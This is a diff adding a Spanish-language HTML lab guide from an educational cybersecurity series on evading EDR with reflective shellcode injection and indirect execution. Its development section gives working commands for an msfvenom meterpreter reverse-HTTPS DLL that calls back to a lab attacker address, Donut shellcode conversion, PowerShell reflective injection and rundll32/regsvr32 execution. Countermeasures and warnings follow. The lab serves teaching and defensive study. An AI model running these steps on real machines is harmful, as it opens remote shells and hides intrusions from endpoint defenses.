@@ -1,1 +1,224 @@
 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 25 – Evasión de EDR mediante técnicas de inyección y ejecución indirecta</title>
+  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 2em;
+      line-height: 1.6;
+    }
+    h1, h2 {
+      color: #90caf9;
+    }
+    code {
+      background-color: #1e1e1e;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: Consolas, monospace;
+    }
+    pre {
+      background-color: #1e1e1e;
+      padding: 1em;
+      border-radius: 6px;
+      overflow-x: auto;
+    }
+    a {
+      color: #90caf9;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Lab 25 – Evasión de EDR mediante técnicas de inyección y ejecución indirecta</h1>
+  <h2>Uso de técnicas avanzadas para evadir soluciones de detección y respuesta en endpoints (EDR)</h2>
+
+  <section>
+    <h2>1. Objetivo</h2>
+    <p>Este laboratorio permite al analista ofensivo comprender cómo funcionan las soluciones EDR y cómo pueden ser evadidas mediante técnicas como inyección de shellcode, ejecución indirecta, uso de procesos legítimos y manipulación de memoria. El objetivo es ejecutar código malicioso sin ser detectado por soluciones modernas de defensa en endpoints.</p>
+  </section>
+
+  <section>
+    <h2>2. Nivel de dificultad</h2>
+    <p>Avanzado</p>
+  </section>
+
+  <section>
+    <h2>3. Herramientas utilizadas</h2>
+    <ul>
+      <li><code>msfvenom</code></li>
+      <li><code>Donut</code></li>
+      <li><code>Invoke-ReflectivePEInjection</code></li>
+      <li><code>Process Hacker</code></li>
+      <li><code>Sysmon</code> y <code>Event Viewer</code> para monitoreo</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>4. Entorno de laboratorio</h2>
+    <p>Máquina atacante con Kali Linux, máquina víctima con Windows 10 y EDR activo (Microsoft Defender for Endpoint o similar), red virtual controlada, snapshot de restauración.</p>
+  </section>
+
+  <section>
+    <h2>5. Escenario</h2>
+    <p>Un analista ofensivo necesita ejecutar un payload en una máquina protegida por EDR. El objetivo es utilizar técnicas de inyección y ejecución indirecta para evitar la detección y lograr la ejecución del código sin activar alertas.</p>
+  </section>
+
+  <section>
+    <h2>6. Pasos previos</h2>
+    <ul>
+      <li>Generar un payload con <code>msfvenom</code> en formato DLL</li>
+      <li>Convertir el DLL a shellcode con <code>Donut</code></li>
+      <li>Preparar scripts de PowerShell para inyección reflectiva</li>
+      <li>Activar monitoreo con Sysmon y visor de eventos</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>7. Desarrollo</h2>
+    <ol>
+      <li>Generar DLL con <code>msfvenom</code>:
+        <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f dll -o payload.dll</code></pre>
+      </li>
+      <li>Convertir a shellcode con Donut:
+        <pre><code>donut payload.dll</code></pre>
+      </li>
+      <li>Inyectar el shellcode con PowerShell:
+        <pre><code>Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcID $pid</code></pre>
+      </li>
+      <li>Observar comportamiento del EDR y eventos generados</li>
+      <li>Probar ejecución indirecta mediante <code>rundll32</code> o <code>regsvr32</code></li>
+      <li>Comparar detección entre ejecución directa e indirecta</li>
+    </ol>
+  </section>
+
+    <section>
+    <h2>8. Resultados esperados</h2>
+    <ul>
+      <li>Detección del payload por el EDR en ejecución directa</li>
+      <li>Ejecución exitosa mediante técnicas de inyección o ejecución indirecta</li>
+      <li>Reducción de alertas o eventos en el visor de eventos</li>
+      <li>Captura de evidencias de ejecución sin detección</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>9. Análisis de resultados</h2>
+    <p>Los EDR modernos detectan comportamientos sospechosos como inyecciones de memoria, uso de APIs críticas o ejecución de binarios no firmados. Al utilizar técnicas como la inyección reflectiva o el uso de procesos legítimos, es posible evadir estas detecciones. El análisis de eventos y alertas permite evaluar la eficacia de cada técnica.</p>
+  </section>
+
+  <section>
+    <h2>10. Conclusiones</h2>
+    <p>La evasión de EDR requiere comprender cómo funcionan sus mecanismos de detección. Las técnicas de ejecución indirecta y manipulación de memoria ofrecen ventajas tácticas, pero deben usarse con responsabilidad. Este laboratorio demuestra que incluso soluciones avanzadas pueden ser evadidas con técnicas bien diseñadas.</p>
+  </section>
+
+  <section>
+    <h2>11. Medidas</h2>
+    <ul>
+      <li>Registrar eventos generados por cada técnica</li>
+      <li>Comparar ejecución directa vs ejecución indirecta</li>
+      <li>Documentar procesos utilizados y su comportamiento</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>12. Contramedidas</h2>
+    <ul>
+      <li>Implementar reglas de detección para procesos LOLBins (Living Off The Land Binaries)</li>
+      <li>Correlacionar eventos de inyección y ejecución anómala</li>
+      <li>Aplicar restricciones de ejecución por firma digital</li>
+      <li>Utilizar EDR con capacidades de análisis de memoria y comportamiento</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>13. Riesgos y advertencias</h2>
+    <p>Estas técnicas pueden comprometer gravemente la seguridad de un sistema si se aplican fuera de entornos controlados. No ejecutar en redes reales sin autorización. El uso indebido puede violar políticas de seguridad o leyes locales.</p>
+  </section>
+
+  <section>
+    <h2>14. Evidencias</h2>
+    <p><em>Espacio reservado para capturas de pantalla de Sysmon, visor de eventos, ejecución de payloads, scripts de inyección y comportamiento del EDR.</em></p>
+  </section>
+
+  <section>
+    <h2>15. Validación cruzada</h2>
+    <ul>
+      <li><a href="https://attack.mitre.org/techniques/T1055/" target="_blank">MITRE ATT&CK T1055 – Process Injection</a></li>
+      <li><a href="https://attack.mitre.org/techniques/T1218/" target="_blank">MITRE ATT&CK T1218 – Signed Binary Proxy Execution</a></li>
+      <li><a href="https://www.cisecurity.org/controls/application-software-security" target="_blank">CIS Control 16 – Application Software Security</a></li>
+      <li><a href="https://csrc.nist.gov/publications/detail/sp/800-94/final" target="_blank">NIST SP 800-94 – Guide to Intrusion Detection and Prevention Systems</a></li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>16. Glosario asociado</h2>
+    <ul>
+      <li><strong>EDR:</strong> Endpoint Detection and Response, solución que monitorea y responde a amenazas en endpoints</li>
+      <li><strong>Inyección de procesos:</strong> Técnica para insertar código malicioso en procesos legítimos</li>
+      <li><strong>LOLBins:</strong> Binarios legítimos del sistema utilizados con fines maliciosos</li>
+      <li><strong>Shellcode:</strong> Código que se ejecuta directamente en memoria para controlar un sistema</li>
+      <li><strong>Reflective Injection:</strong> Técnica que carga un binario en memoria sin escribirlo en disco</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>17. Preguntas de refuerzo</h2>
+    <ol>
+      <li>¿Qué diferencia hay entre un antivirus y un EDR?</li>
+      <li>¿Qué técnicas permiten evadir la detección por EDR?</li>
+      <li>¿Qué riesgos implica la ejecución de código en memoria?</li>
+      <li>¿Qué es un LOLBin y cómo puede usarse ofensivamente?</li>
+      <li>¿Qué contramedidas pueden detectar inyecciones de procesos?</li>
+    </ol>
+  </section>
+
+    <section>
+    <h2>18. Rúbrica de evaluación</h2>
+    <ul>
+      <li>✔️ Ejecuta correctamente técnicas de evasión y captura evidencias</li>
+      <li>✔️ Interpreta el comportamiento del EDR ante cada técnica</li>
+      <li>✔️ Relaciona técnicas con estándares y certificaciones</li>
+      <li>✔️ Aplica medidas y contramedidas con criterio técnico</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>19. Recursos complementarios</h2>
+    <ul>
+      <li><a href="https://github.com/TheWover/donut" target="_blank">Donut – Shellcode Generator for PE Files</a></li>
+      <li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit – Invoke-ReflectivePEInjection</a></li>
+      <li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/overview-endpoint-detection-response" target="_blank">Microsoft Defender for Endpoint – EDR Overview</a></li>
+      <li><a href="https://attack.mitre.org/" target="_blank">MITRE ATT&CK Framework</a></li>
+    </ul>
+  </section>
+
+  <section>
+    <h2>20. Créditos y licencia</h2>
+    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>. Su uso está autorizado únicamente con fines educativos, respetando la trazabilidad editorial y la licencia CC BY-NC-SA 4.0.</p>
+  </section>
+
+  <section>
+    <h2>21. Nivel de certificación</h2>
+    <p>Avanzado – Alineado con CRTO, OSCE3 y eCPTXv2.</p>
+  </section>
+
+  <section>
+    <h2>22. Mapa de integración</h2>
+    <ul>
+      <li>🔗 Continúa el enfoque del <strong>Lab 24</strong> (Evasión de antivirus mediante ofuscación)</li>
+      <li>🧪 Refuerza el dominio de evasión en memoria y técnicas contra EDR</li>
+      <li>🎓 Integra conceptos clave del simulador certificador: <em>EDR Evasion</em>, <em>Process Injection</em>, <em>Execution via LOLBins</em></li>
+    </ul>
+  </section>
+
+</body>
+</html>
